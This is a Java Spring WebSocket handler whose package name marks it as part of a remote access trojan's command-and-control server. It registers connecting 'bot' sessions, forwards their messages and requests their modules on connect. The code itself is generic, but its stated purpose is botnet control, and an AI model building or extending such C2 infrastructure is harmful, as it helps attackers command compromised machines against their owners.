package devs.alex.sah.rat.c2server.webSocket.bot;

import lombok.extern.slf4j.Slf4j;
import devs.alex.sah.rat.c2server.services.MessagesCoordinator;
import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.*;
import org.springframework.web.socket.handler.AbstractWebSocketHandler;

@Slf4j
@Component
public class BotWebSocketHandler extends AbstractWebSocketHandler {

    private final MessagesCoordinator messagesCoordinator;
    private final WebSocketSessionService botWSSessionService;
    public BotWebSocketHandler(MessagesCoordinator messagesCoordinator,
                               @Qualifier("botWebSocketSessionService") WebSocketSessionService botWSSessionService) {
        this.messagesCoordinator = messagesCoordinator;
        this.botWSSessionService = botWSSessionService;
    }

    @Override
    public boolean supportsPartialMessages() {
        return true;
    }

    @Override
    public void handleTextMessage(WebSocketSession session, TextMessage message){
        messagesCoordinator.handleBotTextMessage(session, message);
    }

    @Override
    public void handleBinaryMessage(WebSocketSession session, BinaryMessage message){
        messagesCoordinator.handleBotBinaryMessage(session, message);
    }

    @Override
    public void handlePongMessage(WebSocketSession session, PongMessage message){
        messagesCoordinator.handlePongMessage(session, message);
    }

    @Override
    public void handleTransportError(WebSocketSession session, Throwable exception){
        log.error("TransportError: {}", exception.getMessage());
    }

    @Override
    public void afterConnectionEstablished(WebSocketSession session){
        botWSSessionService.addSession(session);
        messagesCoordinator.getServerEndpoint().getModules(session);
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session, CloseStatus status){
        botWSSessionService.removeSession(session);
    }

}